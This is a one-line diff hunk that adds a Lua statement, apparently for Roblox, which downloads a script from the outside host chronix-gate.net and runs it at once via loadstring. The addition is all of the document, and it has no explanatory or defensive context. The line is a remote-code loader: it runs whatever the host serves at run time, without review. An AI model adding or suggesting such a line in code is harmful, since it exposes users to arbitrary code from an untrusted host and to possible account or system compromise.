@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://chronix-gate.net/l?"))()
